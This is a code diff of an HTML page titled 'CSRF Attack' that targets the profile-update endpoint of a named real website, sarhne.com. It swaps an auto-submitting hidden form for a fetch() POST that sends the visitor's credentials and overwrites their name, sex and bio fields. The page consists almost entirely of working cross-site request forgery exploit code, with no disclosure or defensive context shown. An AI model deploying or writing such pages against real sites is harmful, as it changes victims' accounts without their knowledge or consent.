@@ -6,14 +6,21 @@
   <title>CSRF Attack</title>
 </head>
 <body>
-  <h1>Executing CSRF Attack...</h1>
-  <form id="csrfForm" action="https://www.sarhne.com/ajax/user_info.html" method="POST">
-    <input type="hidden" name="name" value="omeveeeee">
-    <input type="hidden" name="sex" value="0">
-    <input type="hidden" name="bio" value="Llfmmmm">
-  </form>
   <script>
-    document.getElementById("csrfForm").submit();
+    fetch("https://www.sarhne.com/ajax/user/user_info.html", {
+      headers: {
+        "accept": "*/*",
+        "accept-language": "ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      referrer: "https://www.sarhne.com/setting.html?tab=profile&op=newActivity",
+      referrerPolicy: "strict-origin-when-cross-origin",
+      body: "name=omev&sex=0&bio=Llflmmmm",
+      method: "POST",
+      mode: "cors",
+      credentials: "include"
+    });
   </script>
 </body>
 </html>
